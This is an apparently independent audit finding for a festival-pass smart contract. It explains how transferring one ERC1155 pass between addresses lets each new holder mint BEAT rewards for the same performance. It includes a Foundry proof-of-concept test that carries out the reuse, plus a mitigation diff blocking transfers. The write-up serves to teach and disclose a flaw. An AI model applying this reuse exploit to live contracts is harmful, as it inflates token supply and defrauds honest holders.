# H-01: Transferable passes allow one pass to earn rewards for many addresses in the same performance

## Summary

Festival passes are transferable ERC1155 tokens, while attendance is tracked by attendee address. One pass can be used by an address to attend a performance, transferred to another address, and then used again for the same performance, allowing one purchased pass to mint BEAT rewards for many accounts.

## Vulnerability Details

`attendPerformance()` checks only that `msg.sender` currently owns any pass:

```solidity
require(hasPass(msg.sender), "Must own a pass");
```

It also tracks attendance by address:

```solidity
require(!hasAttended[performanceId][msg.sender], "Already attended this performance");
hasAttended[performanceId][msg.sender] = true;
```

The contract inherits OpenZeppelin `ERC1155` and does not make festival passes non-transferable. Therefore, the same pass can be moved between addresses during an active performance. Each new holder has not attended yet, so each one can mint BEAT rewards.

## Impact

One purchased pass can generate rewards for many addresses in the same performance. This inflates BEAT supply beyond the intended reward model and can let attackers redeem limited memorabilia before honest users.

## Proof of Concept

```solidity
function testOnePassCanAttendSamePerformanceThroughMultipleAddresses() public {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    vm.deal(alice, 1 ether);

    vm.prank(alice);
    festivalPass.buyPass{value: GENERAL_PRICE}(1);

    vm.prank(organizer);
    uint256 perfId = festivalPass.createPerformance(block.timestamp + 1 hours, 2 hours, 100e18);

    vm.warp(block.timestamp + 90 minutes);

    vm.prank(alice);
    festivalPass.attendPerformance(perfId);

    vm.prank(alice);
    festivalPass.safeTransferFrom(alice, bob, 1, 1, "");

    vm.prank(bob);
    festivalPass.attendPerformance(perfId);

    assertEq(beatToken.balanceOf(alice), 100e18);
    assertEq(beatToken.balanceOf(bob), 100e18);
}
```

## Recommended Mitigation

Make festival passes non-transferable, or track attendance by a unique pass token rather than only by address.

```diff
+function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data)
+    public
+    override
+{
+    require(id > BACKSTAGE_PASS, "Festival passes are non-transferable");
+    super.safeTransferFrom(from, to, id, value, data);
+}
```

Also override `safeBatchTransferFrom()` to block batched pass transfers.

## Learning Notes

When access tokens are transferable, checking only current ownership does not prove that a pass has not already been used elsewhere.

Relevant concepts: ERC1155 transferability, access-token reuse, reward inflation.

## Analysis Disclosure

Independent review.
